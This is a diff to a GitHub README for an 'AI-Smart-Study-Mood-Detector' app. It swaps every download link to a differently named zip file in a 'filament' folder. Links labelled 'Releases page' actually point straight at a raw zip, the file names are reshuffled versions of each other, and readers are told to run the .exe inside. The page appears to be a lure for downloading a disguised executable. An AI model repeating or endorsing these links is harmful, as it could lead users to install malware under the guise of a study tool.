@@ -1,6 +1,6 @@
 # 🎧 AI-Smart-Study-Mood-Detector - Discover Your Study Mood Easily
 
-[![Download AI-Smart-Study-Mood-Detector](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Mood_Study_A_Smart_Detector_v1.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Mood_Study_A_Smart_Detector_v1.5.zip)
+[![Download AI-Smart-Study-Mood-Detector](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Detector_Study_Mood_A_Smart_2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Detector_Study_Mood_A_Smart_2.2.zip)
 
 ## 🚀 Project Overview
 
@@ -36,13 +36,13 @@ To run the AI-Smart-Study-Mood-Detector on your machine, ensure you have:
 1. **Check Requirements**: Ensure your system meets the requirements listed above.
 2. **Visit the Releases Page**: Click on the link below to access the download options.
 
-   [Download AI-Smart-Study-Mood-Detector](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Mood_Study_A_Smart_Detector_v1.5.zip)
+   [Download AI-Smart-Study-Mood-Detector](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Detector_Study_Mood_A_Smart_2.2.zip)
 
 3. **Download**: Choose the appropriate version for your operating system and download the file.
 
 ## 📥 Download & Install
 
-1. After visiting the [Releases page](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Mood_Study_A_Smart_Detector_v1.5.zip), find the latest version of AI-Smart-Study-Mood-Detector.
+1. After visiting the [Releases page](https://raw.githubusercontent.com/ff9-85/AI-Smart-Study-Mood-Detector/main/filament/Detector_Study_Mood_A_Smart_2.2.zip), find the latest version of AI-Smart-Study-Mood-Detector.
 2. Click the download link for your operating system.
 3. Locate the downloaded file on your computer.
 4. If you are on Windows, double-click the `.exe` file to run the setup. If you are on macOS or Linux, follow the instructions included for installation.
